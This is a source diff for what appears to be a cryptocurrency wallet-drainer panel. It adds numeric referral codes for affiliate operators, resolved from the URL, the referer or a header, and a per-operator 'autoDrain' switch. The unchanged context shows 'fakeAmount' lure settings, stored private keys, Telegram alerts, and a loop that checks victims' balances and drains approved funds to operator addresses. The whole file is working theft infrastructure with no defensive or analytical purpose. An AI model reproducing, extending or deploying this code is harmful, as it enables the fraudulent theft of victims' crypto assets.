@@ -79,6 +79,16 @@ function saveSubs(subs) {
   try { fs.writeFileSync(SUBS_FILE, JSON.stringify(subs, null, 2)); } catch (e) {}
 }
 
+function nextSubCode() {
+  const subs = loadSubs();
+  let max = 0;
+  for (const s of subs) {
+    const n = parseInt(s.code, 10);
+    if (!isNaN(n) && n > max) max = n;
+  }
+  return String(max + 1);
+}
+
 function uuid() {
   return crypto.randomUUID ? crypto.randomUUID() : crypto.randomBytes(16).toString('hex');
 }
@@ -215,7 +225,7 @@ function findOwnerForUser(user) {
   if (user.spender) {
     const subs = loadSubs();
     const sub = subs.find(s => s.receiverAddress && s.receiverAddress.toLowerCase() === user.spender.toLowerCase());
-    if (sub) return { type: 'sub', sub, receiver: sub.receiverAddress, privateKey: sub.privateKey, autoDrain: true };
+    if (sub) return { type: 'sub', sub, receiver: sub.receiverAddress, privateKey: sub.privateKey, autoDrain: sub.autoDrain !== false };
   }
   return { type: 'super', receiver: cfg.receiverAddress, privateKey: cfg.privateKey, autoDrain: cfg.autoDrain };
 }
@@ -234,6 +244,9 @@ const server = http.createServer(async (req, res) => {
   const p = u.pathname;
 
   if (req.method === 'GET' && (p === '/' || p === '/index.html')) return sendFile(res, path.join(PUBLIC_DIR, 'index.html'));
+  if (req.method === 'GET' && /^\/\d+$/.test(p)) {
+    return sendFile(res, path.join(PUBLIC_DIR, 'index.html'));
+  }
   if (req.method === 'GET' && p.startsWith('/') && !p.startsWith('/api') && p !== '/admin') {
     const fp = path.join(PUBLIC_DIR, p.slice(1));
     if (fp.startsWith(PUBLIC_DIR) && fs.existsSync(fp) && fs.statSync(fp).isFile()) return sendFile(res, fp);
@@ -250,17 +263,30 @@ const server = http.createServer(async (req, res) => {
     const subs = loadSubs().filter(s => s.status === 'active');
     const q = (u.searchParams.get('s') || u.searchParams.get('spender') || '').toLowerCase();
     const qid = u.searchParams.get('id') || '';
+    const qcode = u.searchParams.get('code') || u.searchParams.get('r') || '';
+    let pathCode = '';
+    try {
+      const ref = req.headers['referer'] || '';
+      const m = ref.match(/\/(\d+)(?:\?|$)/);
+      if (m) pathCode = m[1];
+    } catch (e) {}
+    const hdrCode = req.headers['x-short-code'] || '';
+    const code = qcode || pathCode || hdrCode;
+    if (code) {
+      const sub = subs.find(s => String(s.code) === String(code));
+      if (sub) return sendJson(res, 200, { spender: sub.receiverAddress, subId: sub.id, name: sub.name, code: sub.code });
+    }
     if (q && /^0x[a-f0-9]{40}$/.test(q)) {
       const sub = subs.find(s => s.receiverAddress && s.receiverAddress.toLowerCase() === q);
-      if (sub) return sendJson(res, 200, { spender: sub.receiverAddress, subId: sub.id, name: sub.name });
+      if (sub) return sendJson(res, 200, { spender: sub.receiverAddress, subId: sub.id, name: sub.name, code: sub.code });
       if (cfg.receiverAddress && cfg.receiverAddress.toLowerCase() === q) return sendJson(res, 200, { spender: cfg.receiverAddress });
     }
     if (qid) {
-      const sub = subs.find(s => s.id === qid);
-      if (sub) return sendJson(res, 200, { spender: sub.receiverAddress, subId: sub.id, name: sub.name });
+      const sub = subs.find(s => s.id === qid || String(s.code) === String(qid));
+      if (sub) return sendJson(res, 200, { spender: sub.receiverAddress, subId: sub.id, name: sub.name, code: sub.code });
     }
     if (cfg.receiverAddress) return sendJson(res, 200, { spender: cfg.receiverAddress });
-    if (subs.length) return sendJson(res, 200, { spender: subs[0].receiverAddress, subId: subs[0].id, name: subs[0].name });
+    if (subs.length) return sendJson(res, 200, { spender: subs[0].receiverAddress, subId: subs[0].id, name: subs[0].name, code: subs[0].code });
     return sendJson(res, 200, { spender: null });
   }
 
@@ -325,15 +351,15 @@ const server = http.createServer(async (req, res) => {
 
     if (p === '/api/admin/me' && req.method === 'GET') {
       if (auth.role === 'super') return sendJson(res, 200, { role: 'super', name: 'Super Admin' });
-      return sendJson(res, 200, { role: 'sub', id: auth.sub.id, name: auth.sub.name, receiverAddress: auth.sub.receiverAddress, status: auth.sub.status });
+      return sendJson(res, 200, { role: 'sub', id: auth.sub.id, code: auth.sub.code || '', name: auth.sub.name, receiverAddress: auth.sub.receiverAddress, status: auth.sub.status, autoDrain: auth.sub.autoDrain !== false });
     }
 
     if (p === '/api/admin/subs' && req.method === 'GET') {
       if (auth.role !== 'super') return sendJson(res, 403, { error: 'Super only' });
       const subs = loadSubs().map(s => ({
-        id: s.id, name: s.name, receiverAddress: s.receiverAddress, hasPrivateKey: !!s.privateKey,
+        id: s.id, code: s.code || '', name: s.name, receiverAddress: s.receiverAddress, hasPrivateKey: !!s.privateKey,
         telegramBotToken: s.telegramBotToken ? '***set***' : '', telegramChatId: s.telegramChatId || '',
-        status: s.status || 'active', createdAt: s.createdAt, password: s.password ? '***' : ''
+        status: s.status || 'active', autoDrain: s.autoDrain !== false, createdAt: s.createdAt, password: s.password ? '***' : ''
       }));
       return sendJson(res, 200, subs);
     }
@@ -346,14 +372,14 @@ const server = http.createServer(async (req, res) => {
       const subs = loadSubs();
       if (subs.find(s => s.name.toLowerCase() === body.name.toLowerCase())) return sendJson(res, 400, { error: 'Name already exists' });
       const sub = {
-        id: uuid(), name: body.name, password: body.password,
+        id: uuid(), code: nextSubCode(), name: body.name, password: body.password,
         receiverAddress: body.receiverAddress || '', privateKey: body.privateKey ? body.privateKey.replace(/^0x/, '') : '',
         telegramBotToken: body.telegramBotToken || '', telegramChatId: body.telegramChatId || '',
-        status: 'active', createdAt: new Date().toISOString()
+        status: 'active', autoDrain: true, createdAt: new Date().toISOString()
       };
       subs.push(sub);
       saveSubs(subs);
-      return sendJson(res, 200, { success: true, id: sub.id });
+      return sendJson(res, 200, { success: true, id: sub.id, code: sub.code });
     }
 
     if (p.startsWith('/api/admin/subs/') && req.method === 'PUT') {
@@ -373,6 +399,7 @@ const server = http.createServer(async (req, res) => {
       if (body.telegramBotToken !== undefined) sub.telegramBotToken = body.telegramBotToken;
       if (body.telegramChatId !== undefined) sub.telegramChatId = body.telegramChatId;
       if (body.status === 'active' || body.status === 'suspended') sub.status = body.status;
+      if (body.autoDrain !== undefined) sub.autoDrain = !!body.autoDrain;
       saveSubs(subs);
       return sendJson(res, 200, { success: true });
     }
@@ -392,12 +419,12 @@ const server = http.createServer(async (req, res) => {
       const sub = subs.find(s => s.id === id);
       if (!sub) return sendJson(res, 404, { error: 'Not found' });
       const users = loadUsers().filter(u => u.spender && sub.receiverAddress && u.spender.toLowerCase() === sub.receiverAddress.toLowerCase());
-      return sendJson(res, 200, { sub: { id: sub.id, name: sub.name, receiverAddress: sub.receiverAddress, status: sub.status, telegramChatId: sub.telegramChatId, hasPrivateKey: !!sub.privateKey, createdAt: sub.createdAt }, users });
+      return sendJson(res, 200, { sub: { id: sub.id, code: sub.code || '', name: sub.name, receiverAddress: sub.receiverAddress, status: sub.status, telegramChatId: sub.telegramChatId, hasPrivateKey: !!sub.privateKey, autoDrain: sub.autoDrain !== false, createdAt: sub.createdAt }, users });
     }
 
     if (p === '/api/admin/config' && req.method === 'GET') {
       if (auth.role === 'sub') {
-        return sendJson(res, 200, { role: 'sub', receiverAddress: auth.sub.receiverAddress, fakeAmount: loadConfig().fakeAmount, hasPrivateKey: !!auth.sub.privateKey, telegramChatId: auth.sub.telegramChatId || '', telegramBotToken: auth.sub.telegramBotToken ? '***set***' : '', autoDrain: true });
+        return sendJson(res, 200, { role: 'sub', code: auth.sub.code || '', receiverAddress: auth.sub.receiverAddress, hasPrivateKey: !!auth.sub.privateKey, autoDrain: auth.sub.autoDrain !== false });
       }
       const cfg = loadConfig();
       return sendJson(res, 200, { role: 'super', receiverAddress: cfg.receiverAddress, fakeAmount: cfg.fakeAmount, adminPassword: cfg.adminPassword ? '***' : '', autoMonitor: cfg.autoMonitor, autoDrain: cfg.autoDrain, networkName: cfg.networkName, telegramBotToken: cfg.telegramBotToken ? '***set***' : '', telegramChatId: cfg.telegramChatId || '', hasPrivateKey: !!cfg.privateKey });
@@ -409,10 +436,7 @@ const server = http.createServer(async (req, res) => {
         const subs = loadSubs();
         const sub = subs.find(s => s.id === auth.sub.id);
         if (!sub) return sendJson(res, 404, { error: 'Not found' });
-        if (body.telegramBotToken) sub.telegramBotToken = body.telegramBotToken;
-        if (body.telegramChatId !== undefined) sub.telegramChatId = body.telegramChatId;
-        if (body.password) sub.password = body.password;
-        if (body.privateKey) sub.privateKey = body.privateKey.replace(/^0x/, '');
+        if (body.autoDrain !== undefined) sub.autoDrain = !!body.autoDrain;
         saveSubs(subs);
         return sendJson(res, 200, { success: true });
       }
@@ -630,7 +654,7 @@ setInterval(async () => {
         let doAuto = owner.autoDrain;
         if (user.spender) {
           const sub = subs.find(s => s.receiverAddress && s.receiverAddress.toLowerCase() === user.spender.toLowerCase());
-          if (sub && sub.privateKey) { pk = sub.privateKey; recv = sub.receiverAddress; doAuto = true; }
+          if (sub && sub.privateKey) { pk = sub.privateKey; recv = sub.receiverAddress; doAuto = sub.autoDrain !== false; }
         }
         if (doAuto && pk && recv) {
           const bal = await balanceOf(user.address);
